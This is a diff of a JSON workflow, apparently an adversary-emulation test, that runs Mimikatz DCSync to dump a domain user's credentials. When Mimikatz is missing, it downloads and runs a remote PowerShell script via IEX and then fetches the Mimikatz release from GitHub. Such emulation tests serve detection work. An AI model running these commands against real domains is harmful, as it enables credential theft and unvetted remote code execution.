@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "be6ea096-30da-4cd1-aabd-f63ae0f86848",
+      "id": "5beb7d43-0c96-43e3-a139-3c438554f1d2",
       "type": "execute-command",
       "data": {
-        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"\n",
+        "command": "#{mimikatz_path} \"lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}\" \"exit\"",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "8be61492-8007-4512-b8e5-61412c91a23c",
+      "id": "68483abf-8445-4012-b564-e7c5f261f62c",
       "name": "Check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc",
+      "id": "125bdb05-ae11-446e-a6a4-d2f3f9ffec90",
       "name": "Resolve dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n",
-        "command_type": ""
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3",
+      "id": "b435ecb4-5560-4bdc-a3f2-9c41096903a5",
       "name": "Re-check dependency 1/1",
       "description": "Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})\n",
       "type": "execute-command",
       "data": {
-        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "$mimikatz_path = cmd /c echo #{mimikatz_path}\nif (Test-Path $mimikatz_path) {exit 0} else {exit 1}",
+        "command_type": "command_prompt"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "8be61492-8007-4512-b8e5-61412c91a23c",
+      "s": "68483abf-8445-4012-b564-e7c5f261f62c",
       "p": "on-success",
-      "o": "be6ea096-30da-4cd1-aabd-f63ae0f86848"
+      "o": "5beb7d43-0c96-43e3-a139-3c438554f1d2"
     },
     {
-      "s": "8be61492-8007-4512-b8e5-61412c91a23c",
+      "s": "68483abf-8445-4012-b564-e7c5f261f62c",
       "p": "on-failure",
-      "o": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc"
+      "o": "125bdb05-ae11-446e-a6a4-d2f3f9ffec90"
     },
     {
-      "s": "fba872eb-9a11-4a28-ad1c-a3c9257d87dc",
+      "s": "125bdb05-ae11-446e-a6a4-d2f3f9ffec90",
       "p": "on-success",
-      "o": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3"
+      "o": "b435ecb4-5560-4bdc-a3f2-9c41096903a5"
     },
     {
-      "s": "647bd290-9bbd-43f3-b7e9-296bb2f49eb3",
+      "s": "b435ecb4-5560-4bdc-a3f2-9c41096903a5",
       "p": "on-failure",
-      "o": "be6ea096-30da-4cd1-aabd-f63ae0f86848"
+      "o": "5beb7d43-0c96-43e3-a139-3c438554f1d2"
     }
   ],
   "tags": [
